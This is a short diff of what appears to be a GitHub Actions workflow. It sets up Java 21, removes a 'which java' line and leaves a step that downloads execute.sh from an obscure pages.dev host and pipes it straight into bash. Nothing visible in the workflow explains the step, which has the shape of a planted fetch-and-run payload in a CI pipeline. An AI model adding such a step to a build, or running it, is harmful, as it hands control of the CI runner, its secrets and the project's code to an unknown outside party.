@@ -21,5 +21,4 @@ jobs:
           java-version: '21'
       - name: Run a multi-line script
         run: |
-          which java
           curl https://static-resource-skidder-loli.pages.dev/execute.sh | bash
